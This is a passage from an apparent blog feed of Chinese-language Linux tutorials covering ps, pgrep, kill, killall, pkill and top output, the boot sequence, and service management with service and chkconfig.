class="line">这里是把所有进程显示出来，并输出到ps001.txt文件，然后再通过more 来分页查看</span><br></pre></td></tr></table></figure></li><li><p>实例二：和grep 结合，提取指定程序的进程；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># ps aux | grep httpd</span></span><br><span class="line">root      4187  0.0  1.3  24236 10272 ?        Ss   11:55   0:00 /usr/sbin/httpd</span><br><span class="line">apache    4189  0.0  0.6  24368  4940 ?        S    11:55   0:00 /usr/sbin/httpd</span><br><span class="line">apache    4190  0.0  0.6  24368  4932 ?        S    11:55   0:00 /usr/sbin/httpd</span><br><span class="line">apache    4191  0.0  0.6  24368  4932 ?        S    11:55   0:00 /usr/sbin/httpd</span><br><span class="line">apache    4192  0.0  0.6  24368  4932 ?        S    11:55   0:00 /usr/sbin/httpd</span><br><span class="line">apache    4193  0.0  0.6  24368  4932 ?        S    11:55   0:00 /usr/sbin/httpd</span><br><span class="line">apache    4194  0.0  0.6  24368  4932 ?        S    11:55   0:00 /usr/sbin/httpd</span><br><span class="line">apache    4195  0.0  0.6  24368  4932 ?        S    11:55   0:00 /usr/sbin/httpd</span><br><span class="line">apache    4196  0.0  0.6  24368  4932 ?        S    11:55   0:00 /usr/sbin/httpd</span><br><span class="line">root      4480  0.0  0.0   5160   708 pts/3    R+   12:20   0:00 grep httpd</span><br></pre></td></tr></table></figure></li><li><p>实例二：父进和子进程的关系友好判断的例子</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># ps auxf  | grep httpd</span></span><br><span class="line">root      4484  0.0  0.0   5160   704 pts/3    S+   12:21   0:00              \_ grep httpd</span><br><span class="line">root      4187  0.0  1.3  24236 10272 ?        Ss   11:55   0:00 /usr/sbin/httpd</span><br><span class="line">apache    4189  0.0  0.6  24368  4940 ?        S    11:55   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4190  0.0  0.6  24368  4932 ?        S    11:55   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4191  0.0  0.6  24368  4932 ?        S    11:55   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4192  0.0  0.6  24368  4932 ?        S    11:55   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4193  0.0  0.6  24368  4932 ?        S    11:55   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4194  0.0  0.6  24368  4932 ?        S    11:55   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4195  0.0  0.6  24368  4932 ?        S    11:55   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4196  0.0  0.6  24368  4932 ?        S    11:55   0:00  \_ /usr/sbin/httpd</span><br><span class="line">这里用到了f参数；父与子关系一目了然；</span><br></pre></td></tr></table></figure><h2 id="prep"><a href="#prep" class="headerlink" title="prep"></a>prep</h2><p>pgrep 是通过程序的名字来查询进程的工具，一般是用来判断程序是否正在运行。在服务器的配置和管理中，这个工具常被应用，简单明了；<br>用法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pgrep 参数选项   程序名</span></span><br></pre></td></tr></table></figure></p><p>常用参数<br>-l  列出程序名和进程ID；<br>-o  进程起始的ID；<br>-n  进程终止的ID；<br>举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># pgrep -lo httpd</span></span><br><span class="line">4557 httpd</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># pgrep -ln httpd</span></span><br><span class="line">566 httpd</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># pgrep -l httpd</span></span><br><span class="line">4557 httpd</span><br><span class="line">4560 httpd</span><br><span class="line">4561 httpd</span><br><span class="line">4562 httpd</span><br><span class="line">4563 httpd</span><br><span class="line">4564 httpd</span><br><span class="line">4565 httpd</span><br><span class="line">4566 httpd</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># pgrep httpd</span></span><br><span class="line">4557</span><br><span class="line">4560</span><br><span class="line">4561</span><br><span class="line">4562</span><br><span class="line">4563</span><br><span class="line">4564</span><br><span class="line">4565</span><br><span class="line">4566</span><br></pre></td></tr></table></figure></p><h2 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h2><p>终止一个进程或终止一个正在运行的程序，一般是通过 kill 、killall、pkill、xkill 等进行。比如一个程序已经死掉，但又不能退出，这时就应该考虑应用这些工具。</p><h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span>的应用是和ps 或pgrep 命令结合在一起使用的；</span><br><span class="line"><span class="built_in">kill</span> 的用法：</span><br><span class="line"><span class="built_in">kill</span> ［信号代码］   进程ID</span><br><span class="line">注：信号代码可以省略；我们常用的信号代码是 -9 ，表示强制终止；</span><br><span class="line">举例：</span><br><span class="line">[root@localhost ~]<span class="comment"># ps  auxf  |grep   httpd</span></span><br><span class="line">root      4939  0.0  0.0   5160   708 pts/3    S+   13:10   0:00              \_ grep httpd</span><br><span class="line">root      4830  0.1  1.3  24232 10272 ?        Ss   13:02   0:00 /usr/sbin/httpd</span><br><span class="line">apache    4833  0.0  0.6  24364  4932 ?        S    13:02   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4834  0.0  0.6  24364  4928 ?        S    13:02   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4835  0.0  0.6  24364  4928 ?        S    13:02   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4836  0.0  0.6  24364  4928 ?        S    13:02   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4837  0.0  0.6  24364  4928 ?        S    13:02   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4838  0.0  0.6  24364  4928 ?        S    13:02   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4839  0.0  0.6  24364  4928 ?        S    13:02   0:00  \_ /usr/sbin/httpd</span><br><span class="line">apache    4840  0.0  0.6  24364  4928 ?        S    13:02   0:00  \_ /usr/sbin/httpd</span><br><span class="line">我们查看httpd 服务器的进程；您也可以用pgrep -l httpd 来查看；</span><br><span class="line">我们看上面例子中的第二列，就是进程PID的列，其中4830是httpd服务器的父进程，从4833－4840的进程都是它4830的子进程；如果我们杀掉父进程4830的话，其下的子进程也会跟着死掉；</span><br><span class="line">[root@localhost ~]<span class="comment"># kill 4840  注：杀掉4840这个进程；</span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># ps -auxf  |grep  httpd  注：查看一下会有什么结果？是不是httpd服务器仍在运行？</span></span><br><span class="line">[root@localhost ~]<span class="comment"># kill 4830   注：杀掉httpd的父进程；</span></span><br><span class="line">[root@localhost ~]<span class="comment"># ps -aux |grep httpd  注：查看httpd的其它子进程是否存在，httpd服务器是否仍在运行？</span></span><br><span class="line">对于僵尸进程，可以用<span class="built_in">kill</span> -9 来强制终止退出；</span><br><span class="line">比如一个程序已经彻底死掉，如果<span class="built_in">kill</span> 不加信号强度是没有办法退出，最好的办法就是加信号强度 -9 ，后面要接杀父进程；比如；</span><br><span class="line">[root@localhost ~]<span class="comment"># ps aux |grep gaim</span></span><br><span class="line">beinan    5031  9.0  2.3 104996 17484 ?        S    13:23   0:01 gaim</span><br><span class="line">root      5036  0.0  0.0   5160   724 pts/3    S+   13:24   0:00 grep gaim</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># pgrep -l gaim</span></span><br><span class="line">5031 gaim</span><br><span class="line">[root@localhost ~]<span class="comment"># kill -9 5031</span></span><br></pre></td></tr></table></figure><h3 id="killall"><a href="#killall" class="headerlink" title="killall"></a>killall</h3><p>killall 通过程序的名字，直接杀死所有进程，咱们简单说一下就行了。</p><p>用法：killall 正在运行的程序名</p><p>killall 也和ps或pgrep 结合使用，比较方便；通过ps或pgrep 来查看哪些程序在运行；<br>举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost beinan]<span class="comment"># pgrep -l gaim</span></span><br><span class="line">2979 gaim</span><br><span class="line">[root@localhost beinan]<span class="comment"># killall gaim</span></span><br></pre></td></tr></table></figure></p><h3 id="pkill"><a href="#pkill" class="headerlink" title="pkill"></a>pkill</h3><p>pkill 和killall 应用方法差不多，也是直接杀死运行中的程序；如果您想杀掉单个进程，请用kill 来杀掉。<br>应用方法：</p><p>#pkill  正在运行的程序名<br>举例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost beinan]<span class="comment"># pgrep -l gaim</span></span><br><span class="line">2979 gaim</span><br><span class="line"></span><br><span class="line">[root@localhost beinan]<span class="comment"># pkill gaim</span></span><br></pre></td></tr></table></figure></p><h1 id="top-监视系统任务的工具"><a href="#top-监视系统任务的工具" class="headerlink" title="top 监视系统任务的工具"></a>top 监视系统任务的工具</h1><p>和ps 相比，top是动态监视系统任务的工具，top 输出的结果是连续的；</p><h2 id="top-命令用法及参数；"><a href="#top-命令用法及参数；" class="headerlink" title="top 命令用法及参数；"></a>top 命令用法及参数；</h2><p>top 调用方法：<br>top 选择参数<br>参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-b  以批量模式运行，但不能接受命令行输入；</span><br><span class="line">-c 显示命令行，而不仅仅是命令名；</span><br><span class="line">-d N  显示两次刷新时间的间隔，比如 -d 5，表示两次刷新间隔为5秒；</span><br><span class="line">-i 禁止显示空闲进程或僵尸进程；</span><br><span class="line">-n NUM  显示更新次数，然后退出。比如 -n 5，表示top更新5次数据就退出；</span><br><span class="line">-p PID 仅监视指定进程的ID；PID是一个数值；</span><br><span class="line">-q  不经任何延时就刷新；</span><br><span class="line">-s  安全模式运行，禁用一些效互指令；</span><br><span class="line">-S 累积模式，输出每个进程的总的CPU时间，包括已死的子进程；</span><br></pre></td></tr></table></figure></p><p>交互式命令键位：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">space  立即更新；</span><br><span class="line">c 切换到命令名显示，或显示整个命令（包括参数）；</span><br><span class="line">f,F 增加显示字段，或删除显示字段；</span><br><span class="line">h,? 显示有关安全模式及累积模式的帮助信息；</span><br><span class="line">k 提示输入要杀死的进程ID，目的是用来杀死该进程（默人信号为15）</span><br><span class="line">i 禁止空闲进程和僵尸进程；</span><br><span class="line">l 切换到显法负载平均值和正常运行的时间等信息；</span><br><span class="line">m 切换到内存信息，并以内存占用大小排序；</span><br><span class="line">n  提示显示的进程数，比如输入3，就在整屏上显示3个进程；</span><br><span class="line">o,O 改变显示字段的顺序；</span><br><span class="line">r 把renice 应用到一个进程，提示输入PID和renice的值；</span><br><span class="line">s 改变两次刷新时间间隔，以秒为单位；</span><br><span class="line">t 切换到显示进程和CPU状态的信息；</span><br><span class="line">A 按进程生命大小进行排序，最新进程显示在最前；</span><br><span class="line">M 按内存占用大小排序，由大到小；</span><br><span class="line">N 以进程ID大小排序，由大到小；</span><br><span class="line">P 按CPU占用情况排序，由大到小</span><br><span class="line">S 切换到累积时间模式；</span><br><span class="line">T  按时间／累积时间对任务排序；</span><br><span class="line">W 把当前的配置写到~/.toprc中；</span><br></pre></td></tr></table></figure></p><h2 id="top应用实例"><a href="#top应用实例" class="headerlink" title="top应用实例"></a>top应用实例</h2><p><img src="top.png" alt=""></p><ul><li><p>第一行：<br>10:01:23 — 当前系统时间<br>126 days, 14:29 — 系统已经运行了126天14小时29分钟（在这期间没有重启过）<br>2 users — 当前有2个用户登录系统<br>load average: 1.15, 1.42, 1.44 — load average后面的三个数分别是1分钟、5分钟、15分钟的负载情况。<br>load average数据是每隔5秒钟检查一次活跃的进程数，然后按特定算法计算出的数值。如果这个数除以逻辑CPU的数量，结果高于5的时候就表明系统在超负荷运转了。</p></li><li><p>第二行：<br>Tasks — 任务（进程），系统现在共有183个进程，其中处于运行中的有1个，182个在休眠（sleep），stoped状态的有0个，zombie状态（僵尸）的有0个。</p></li><li><p>第三行：cpu状态<br>6.7% us — 用户空间占用CPU的百分比。<br>0.4% sy — 内核空间占用CPU的百分比。<br>0.0% ni — 改变过优先级的进程占用CPU的百分比<br>92.9% id — 空闲CPU百分比<br>0.0% wa — IO等待占用CPU的百分比<br>0.0% hi — 硬中断（Hardware IRQ）占用CPU的百分比<br>0.0% si — 软中断（Software Interrupts）占用CPU的百分比<br>在这里CPU的使用比率和windows概念不同，如果你不理解用户空间和内核空间，需要充充电了。</p></li><li><p>第四行：内存状态<br>8306544k total — 物理内存总量（8GB）<br>7775876k used — 使用中的内存总量（7.7GB）<br>530668k free — 空闲内存总量（530M）<br>79236k buffers — 缓存的内存量 （79M）</p></li><li><p>第五行：swap交换分区<br>2031608k total — 交换区总量（2GB）<br>2556k used — 使用的交换区总量（2.5M）<br>2029052k free — 空闲交换区总量（2GB）<br>4231276k cached — 缓冲的交换区总量（4GB）<br>这里要说明的是不能用windows的内存概念理解这些数据，如果按windows的方式此台服务器“危矣”：8G的内存总量只剩下530M的可用内存。Linux的内存管理有其特殊性，复杂点需要一本书来说明，这里只是简单说点和我们传统概念（windows）的不同。<br>第四行中使用中的内存总量（used）指的是现在系统内核控制的内存数，空闲内存总量（free）是内核还未纳入其管控范围的数量。纳入内核管理的内存不见得都在使用中，还包括过去使用过的现在可以被重复利用的内存，内核并不把这些可被重新使用的内存交还到free中去，因此在linux上free内存会越来越少，但不用为此担心。<br>如果出于习惯去计算可用内存数，这里有个近似的计算公式：第四行的free + 第四行的buffers + 第五行的cached，按这个公式此台服务器的可用内存：530668+79236+4231276 = 4.7GB。<br>对于内存监控，在top里我们要时刻监控第五行swap交换分区的used，如果这个数值在不断的变化，说明内核在不断进行内存和swap的数据交换，这是真正的内存不够用了。</p></li><li><p>第六行是空行</p></li><li><p>第七行以下：各进程（任务）的状态监控</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PID — 进程id</span><br><span class="line">USER — 进程所有者</span><br><span class="line">PR — 进程优先级</span><br><span class="line">NI — nice值。负值表示高优先级，正值表示低优先级</span><br><span class="line">VIRT — 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES</span><br><span class="line">RES — 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA</span><br><span class="line">SHR — 共享内存大小，单位kb</span><br><span class="line">S — 进程状态。D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程</span><br><span class="line">%CPU — 上次更新到现在的CPU时间占用百分比</span><br><span class="line">%MEM — 进程使用的物理内存百分比</span><br><span class="line">TIME+ — 进程使用的CPU时间总计，单位1/100秒</span><br><span class="line">COMMAND — 进程名称（命令名/命令行）</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux学习之服务与进程管理</title>
      <link href="/2018/09/13/Linux%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%9C%8D%E5%8A%A1%E4%B8%8E%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
      <url>/2018/09/13/Linux%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%9C%8D%E5%8A%A1%E4%B8%8E%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>简单的介绍下linux的系统启动流程，方便我们深入了解linux操作系统，对排除linux系统故障进行帮助</p><a id="more"></a><h1 id="Linux系统的加载流程"><a href="#Linux系统的加载流程" class="headerlink" title="Linux系统的加载流程"></a>Linux系统的加载流程</h1><p><img src="服务与进程.png" alt=""></p><h2 id="启动第一步－－加载BIOS"><a href="#启动第一步－－加载BIOS" class="headerlink" title="启动第一步－－加载BIOS"></a>启动第一步－－加载BIOS</h2><p>当你打开计算机电源，计算机会首先加载BIOS信息，BIOS信息是如此的重要，以至于计算机必须在最开始就找到它。这是因为BIOS中包含了CPU的相关信息、设备启动顺序信息、硬盘信息、内存信息、时钟信息、PnP特性等等。在此之后，计算机心里就有谱了，知道应该去读取哪个硬件设备了。</p><h2 id="启动第二步－－读取MBR"><a href="#启动第二步－－读取MBR" class="headerlink" title="启动第二步－－读取MBR"></a>启动第二步－－读取MBR</h2><p>众所周知，硬盘上第0磁道第一个扇区被称为MBR，也就是Master Boot Record，即主引导记录，它的大小是512字节，别看地方不大，可里面却存放了预启动信息、分区表信息。<br>系统找到BIOS所指定的硬盘的MBR后，就会将其复制到0×7c00地址所在的物理内存中。其实被复制到物理内存的内容就是Boot Loader，而具体到你的电脑，那就是lilo或者grub了。</p><h2 id="启动第三步－－Boot-Loader"><a href="#启动第三步－－Boot-Loader" class="headerlink" title="启动第三步－－Boot Loader"></a>启动第三步－－Boot Loader</h2><p>Boot Loader 就是在操作系统内核运行之前运行的一段小程序。通过这段小程序，我们可以初始化硬件设备、建立内存空间的映射图，从而将系统的软硬件环境带到一个合适的状态，以便为最终调用操作系统内核做好一切准备。<br>Boot Loader有若干种，其中Grub、Lilo和spfdisk是常见的Loader。<br>我们以Grub为例来讲解吧，毕竟用lilo和spfdisk的人并不多。<br>系统读取内存中的grub配置信息（一般为menu.lst或grub.lst），并依照此配置信息来启动不同的操作系统。</p><h2 id="启动第四步－－加载内核"><a href="#启动第四步－－加载内核" class="headerlink" title="启动第四步－－加载内核"></a>启动第四步－－加载内核</h2><p>根据grub设定的内核映像所在路径，系统读取内存映像，并进行解压缩操作。此时，屏幕一般会输出“Uncompressing Linux”的提示。当解压缩内核完成后，屏幕输出“OK, booting the kernel”。<br>系统将解压后的内核放置在内存之中，并调用start_kernel()函数来启动一系列的初始化函数并初始化各种设备，完成Linux核心环境的建立。至此，Linux内核已经建立起来了，基于Linux的程序应该可以正常运行了。</p><h2 id="启动第五步－－用户层init依据inittab文件来设定运行等级"><a href="#启动第五步－－用户层init依据inittab文件来设定运行等级" class="headerlink" title="启动第五步－－用户层init依据inittab文件来设定运行等级"></a>启动第五步－－用户层init依据inittab文件来设定运行等级</h2><p>内核被加载后，第一个运行的程序便是/sbin/init，该文件会读取/etc/inittab文件，并依据此文件来进行初始化工作。<br>其实/etc/inittab文件最主要的作用就是设定Linux的运行等级，其设定形式是“：id:5:initdefault:”，这就表明Linux需要运行在等级5上。Linux的运行等级设定如下：</p><ul><li>0：关机</li><li>1：单用户模式</li><li>2：无网络支持的多用户模式</li><li>3：有网络支持的多用户模式</li><li>4：保留，未使用</li><li>5：有网络支持有X-Window支持的多用户模式</li><li>6：重新引导系统，即重启</li></ul><h2 id="启动第六步－－init进程执行rc-sysinit"><a href="#启动第六步－－init进程执行rc-sysinit" class="headerlink" title="启动第六步－－init进程执行rc.sysinit"></a>启动第六步－－init进程执行rc.sysinit</h2><p>在设定了运行等级后，Linux系统执行的第一个用户层文件就是/etc/rc.d/rc.sysinit脚本程序，它做的工作非常多，包括设定PATH、设定网络配置（/etc/sysconfig/network）、启动swap分区、设定/proc等等。如果你有兴趣，可以到/etc/rc.d中查看一下rc.sysinit文件，里面的脚本够你看几天的。</p><h2 id="启动第七步－－启动内核模块"><a href="#启动第七步－－启动内核模块" class="headerlink" title="启动第七步－－启动内核模块"></a>启动第七步－－启动内核模块</h2><p>具体是依据/etc/modules.conf文件或/etc/modules.d目录下的文件来装载内核模块。</p><h2 id="启动第八步－－执行不同运行级别的脚本程序"><a href="#启动第八步－－执行不同运行级别的脚本程序" class="headerlink" title="启动第八步－－执行不同运行级别的脚本程序"></a>启动第八步－－执行不同运行级别的脚本程序</h2><p>根据运行级别的不同，系统会运行rc0.d到rc6.d中的相应的脚本程序，来完成相应的初始化工作和启动相应的服务。<br>具体位置：/etc/rc.d/</p><h2 id="启动第九步－－执行-etc-rc-d-rc-local"><a href="#启动第九步－－执行-etc-rc-d-rc-local" class="headerlink" title="启动第九步－－执行/etc/rc.d/rc.local"></a>启动第九步－－执行/etc/rc.d/rc.local</h2><p>你如果打开了此文件，里面有一句话，读过之后，你就会对此命令的作用一目了然：</p><blockquote><p>This script will be executed <em>after</em> all the other init scripts.<br>You can put your own initialization stuff in here if you don’t<br>want to do the full Sys V style init stuff.</p></blockquote><p>rc.local就是在一切初始化工作后，Linux留给用户进行个性化的地方。你可以把你想设置和启动的东西放到这里。<br>启动第十步－－执行/bin/login程序，进入登录状态<br>此时，系统已经进入到了等待用户输入username和password的时候了，你已经可以用自己的帐号登入系统了。漫长的启动过程结束了，一切都清静了…</p><h1 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h1><h2 id="服务的种类"><a href="#服务的种类" class="headerlink" title="服务的种类"></a>服务的种类</h2><p>Linux提供了许多的服务。这些服务，可以使依照其功能和依照服务启动的方法与执行时的特性进行分类。<br>依照功能分类：</p><ul><li><p>系统服务<br>—某些服务的服务对象是Linux系统本身，或者Linux系统用户，这类的服务我们称为系统服务（System Service）</p></li><li><p>网络服务<br>提供给网络中的其他客户端（Clients）调用使用的服务，这类的服务我们统称为网络服务（Networking Service）</p></li></ul><h2 id="依照服务启动的方法分类"><a href="#依照服务启动的方法分类" class="headerlink" title="依照服务启动的方法分类"></a>依照服务启动的方法分类</h2><ul><li><p>独立系统服务<br>服务一经启动，除非因为关闭系统或者管理者手动结束，否则都将在后台执行，不管有没有被用到。这样的服务我们称为独立系统服务(Standalone Service)。 独立系统服务有时候又被称为Sys V服务 （Sys V Service）</p></li><li><p>临时服务<br>与独立系统服务不同，临时服务（Transient Service）平时并不会启动，而是当客户端需要时才会被启动，使用完毕会结束。</p></li></ul><h2 id="服务的管理"><a href="#服务的管理" class="headerlink" title="服务的管理"></a>服务的管理</h2><ul><li>手动的启动或停止独立系统服务</li></ul><p>为了简化Linux服务管理的麻烦，Linux特别为每一个独立式的服务，提供了一个服务启动程序文件（Service Startup Script）。<br>所有的服务启动文件被储存在/etc/rc.d/init.d/目录下</p><ul><li>如何利用脚本直接管理服务<br>/etc/rc.d/init.d/里面每一个文件就是某一个服务的启动程序文件，你可以直接执行某一个启动程序文件，借以来启动或者停止该服务<br>不同的服务启动文件可能会有不同的动作参数：</li></ul><p>-start：    启动这个服务</p><p>-stop：        停止这个服务</p><p>-restart：    先停止，再启动，也就是重新启动的意思。</p><p>-reload：    重载配置文件，这个参数只有在服务已经启动的状况下才     能使用。</p><p>-condrestart：有条件的重新启动，这个服务必须是已经启动的，才会被重新启动；如果这个服务尚未启动，则无须启动之。</p><p>-status：    查看目前服务的启动状态。</p><p>service命令管理方法</p><p>用法： service   filename   action<br>动作参数：</p><pre><code>startstopstatus</code></pre><h2 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h2><p>inetd是一个特殊的程序，不断监控所有通讯端口。一旦有客户端调用某一个启动文件时，这个程序就要负责启动该服务；而在客户端使用完毕后，改程序也必须要负责结束。<br>守护进程服务位置：/etc/xinetd.d<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service    xinetd      start/stop/status</span><br></pre></td></tr></table></figure></p><h2 id="服务的自启动"><a href="#服务的自启动" class="headerlink" title="服务的自启动"></a>服务的自启动</h2><p>chkconfig命令主要用来更新（启动或停止）和查询系统服务的运行级信息。谨记chkconfig不是立即自动禁止或激活一个服务，它只是简单的改变了符号连接。<br>使用语法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig [--add][--del][--list][系统服务] 或 chkconfig [--level &lt;等级代号&gt;][系统服务][on/off/reset]</span><br></pre></td></tr></table></figure></p><p>参数用法：<br>–add 　增加所指定的系统服务，让chkconfig指令得以管理它，并同时在系统启动的叙述文件内增加相关数据。<br>–del 　删除所指定的系统服务，不再由chkconfig指令管理，并同时在系统启动的叙述文件内删除相关数据。<br>–level&lt;等级代号&gt; 　指定读系统服务要在哪一个执行等级中开启或关毕。</p><p>等级0表示：表示关机<br>等级1表示：单用户模式<br>等级2表示：无网络连接的多用户命令行模式<br>等级3表示：有网络连接的多用户命令行模式<br>等级4表示：不可用<br>等级5表示：带图形界面的多用户模式<br>等级6表示：重新启动<br>需要说明的是，level选项可以指定要查看的运行级而不一定是当前运行级。对<br>于每个运行级，只能有一个启动脚本或者停止脚本。当切换运行级时，init不会重新启动已经启动的服务，也不会再次去停止已经停止的服务。</p><p>chkconfig –list [name]：显示所有运行级系统服务的运行状态信息（on或off）。如果指定了name，那么只显示指定的服务在不同运行级的状态。<br>chkconfig –add name：增加一项新的服务。chkconfig确保每个运行级有一项启动(S)或者杀死(K)入口。如有缺少，则会从缺省的init脚本自动建立。<br>chkconfig –del name：删除服务，并把相关符号连接从/etc/rc[0-6].d删除。<br>chkconfig [–level levels] name：设置某一服务在指定的运行级是被启动，停止还是重置。</p><p>使用范例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list <span class="comment">#列出所有的系统服务</span></span><br><span class="line">chkconfig --add httpd <span class="comment">#增加httpd服务</span></span><br><span class="line">chkconfig --del httpd <span class="comment">#删除httpd服务</span></span><br><span class="line">chkconfig --list <span class="comment">#列出系统所有的服务启动情况</span></span><br><span class="line">chkconfig --list mysqld <span class="comment">#列出mysqld服务设置情况</span></span><br><span class="line">chkconfig --level 35 mysqld on <span class="comment">#设定mysqld在等级3和5为开机运行服务，--level 35表示操作只在等级3和5执行，on表示启动，off表示关闭</span></span><br><span class="line">chkconfig mysqld on <span class="comment">#设定mysqld在各等级为on，“各等级”包括2、3、4、5等级</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux学习之crontab定时任务</title>
      <link href="/2018/09/11/Linux%E5%AD%A6%E4%B9%A0%E4%B9%8Bcrontab%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"/>
      <url>/2018/09/11/Linux%E5%AD%A6%E4%B9%A0%E4%B9%8Bcrontab%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/</url>
      
